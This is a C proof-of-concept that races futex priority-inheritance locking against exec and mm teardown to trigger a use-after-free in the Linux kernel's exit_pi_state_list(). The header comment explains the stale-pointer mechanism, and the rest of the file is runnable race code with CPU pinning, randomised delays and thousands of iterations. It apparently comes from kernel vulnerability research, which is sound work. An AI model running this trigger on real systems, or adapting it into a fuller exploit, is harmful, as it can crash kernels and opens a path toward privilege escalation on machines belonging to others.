/*
 * l83_futex_pi_exit_uaf.c - PI/exec race with the mm teardown forced *before*
 * the exec'ing task exits.
 *
 * Why the earlier attempts could not crash: the stale pi_state is only
 * dereferenced at task exit, in exit_pi_state_list():
 *
 *     key = pi_state->key;
 *     CLASS(hb, hb)(&key);      -> futex_hash(&key)
 *                                  -> __futex_hash(): key->private.mm->futex_phash
 *
 * and the old mm was still alive at that point (our harness kept waiting for the
 * children).  Here the mm is torn down first:
 *
 *   A (attempt process) clones O and W with CLONE_VM, then exits immediately
 *   W does its single attach attempt and exits              -> mm_users--
 *   O execs (drops the old mm) and, 40 ms later, exits      -> mm already gone
 *
 * If the attach landed in the exec window, O still carries a pi_state whose
 * key.private.mm points at freed memory, and its exit dereferences it.
 */
#define _GNU_SOURCE
#include <linux/futex.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define STACK_SZ (64 * 1024)
#define MAX_WAIT_NS 400000L

static uint32_t g_word;
static volatile int g_ready;
static const char *g_self;

static long now_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000L + t.tv_nsec;
}

static int fp(uint32_t *u, int op)
{
    return (int)syscall(SYS_futex, u, op | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static void pin(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu % 8, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int w_fn(void *arg)
{
    unsigned long delay = (unsigned long)arg;
    pin(3);
    while (!g_ready) { }
    if (delay) {
        long until = now_ns() + (long)delay;
        while (now_ns() < until) { }
    }
    fp(&g_word, FUTEX_TRYLOCK_PI);
    _exit(0);
}

static int o_fn(void *arg)
{
    (void)arg;
    pin(2);
    fp(&g_word, FUTEX_LOCK_PI);
    g_ready = 1;
    char *av[] = { (char *)g_self, (char *)"--exec-side", NULL };
    execv(g_self, av);
    _exit(3);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--exec-side")) {
        /* let the old mm die before this task exits */
        usleep(40 * 1000);
        _exit(0);
    }

    int iters = argc > 1 ? atoi(argv[1]) : 20000;
    char selfbuf[256];
    ssize_t n = readlink("/proc/self/exe", selfbuf, sizeof selfbuf - 1);
    if (n <= 0) return 1;
    selfbuf[n] = 0;
    g_self = selfbuf;

    srand((unsigned)now_ns());
    printf("=== l83 PI/exec -> exit_pi_state_list UAF (uid=%d, iters=%d) ===\n",
           (int)getuid(), iters);
    fflush(stdout);

    long t0 = now_ns();
    int done = 0;

    for (int it = 0; it < iters; it++) {
        pid_t a = fork();
        if (a == 0) {
            g_word = 0;
            g_ready = 0;
            void *so = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            void *sw = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            if (so == MAP_FAILED || sw == MAP_FAILED) _exit(4);

            unsigned long delay = (unsigned long)(rand() % MAX_WAIT_NS);
            pid_t w = clone(w_fn, (char *)sw + STACK_SZ, CLONE_VM | SIGCHLD, (void *)delay);
            pid_t o = clone(o_fn, (char *)so + STACK_SZ, CLONE_VM | SIGCHLD, NULL);
            if (w < 0 || o < 0) _exit(5);
            /* do NOT wait: drop our mm reference right away */
            _exit(0);
        }
        if (a < 0) break;
        int st = 0;
        waitpid(a, &st, 0);
        done++;
        /* small stagger so O's exit lands after the mm is gone */
        usleep(1000);
        if ((it & 0x1ff) == 0 && it) {
            printf("iter=%d elapsed=%.1fs (%.0f/s)\n", it, (now_ns() - t0) / 1e9,
                   it / ((now_ns() - t0) / 1e9));
            fflush(stdout);
        }
    }

    printf("done: %d iterations in %.1fs, no crash\n", done, (now_ns() - t0) / 1e9);
    return 0;
}
